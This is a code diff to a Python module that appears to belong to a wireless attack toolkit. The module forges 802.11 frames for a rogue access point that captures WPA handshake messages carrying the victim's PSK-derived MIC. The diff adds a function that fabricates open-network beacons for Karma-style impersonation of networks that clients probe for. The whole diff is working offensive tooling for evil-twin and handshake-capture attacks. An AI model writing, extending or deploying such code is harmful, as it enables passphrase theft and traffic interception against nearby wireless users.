@@ -5,9 +5,10 @@ channel; ``auth_resp`` / ``assoc_resp`` / ``eapol_m1`` answer auth/assoc then op
 our ANonce so the client's M2 (its MIC binds the real PSK) is captured.
 """
 import struct
+import time
 from typing import Optional
 
-from wifit3.dot11.ie import rates_ie, ext_rates_ie, ds_param_ie, force_psk_akm, GENERIC_RSN_IE
+from wifit3.dot11.ie import ssid_ie, rates_ie, ext_rates_ie, ds_param_ie, force_psk_akm, GENERIC_RSN_IE
 from wifit3.dot11.eapol import data_header, eapol_key, LLC_SNAP_EAPOL
 
 _CAP_ESS = 0x0001
@@ -44,6 +45,17 @@ def eapol_m1(bssid: bytes, client: bytes, anonce: bytes, replay: int = 1) -> byt
     """4-way message 1 (AP->client): our ANonce, no MIC."""
     payload = eapol_key(key_info=_M1_KEY_INFO, key_len=_CCMP_KEY_LEN, replay=replay, nonce=anonce)
     return data_header(to_ds=False, bssid=bssid, client=client) + LLC_SNAP_EAPOL + payload
+
+
+def open_beacon(bssid: bytes, ssid: str, channel: int) -> bytes:
+    """A from-scratch open-network beacon: no real AP to rewrite (unlike ``beacon_clone``), for a
+    responder fabricating a network by name alone (Karma-style). ESS only, no RSN IE."""
+    hdr = b"\x80\x00" + b"\x00\x00" + b"\xff\xff\xff\xff\xff\xff" + bssid + bssid + b"\x00\x00"
+    fixed = (struct.pack("<Q", int(time.time() * 1_000_000))
+             + struct.pack("<H", 100)                      # beacon interval, 100 TU
+             + struct.pack("<H", _CAP_ESS))
+    tags = ssid_ie(ssid) + rates_ie() + ds_param_ie(channel) + ext_rates_ie()
+    return hdr + fixed + tags
 
 
 def _ht_op_to_channel(elem: bytes, channel: int) -> bytes:
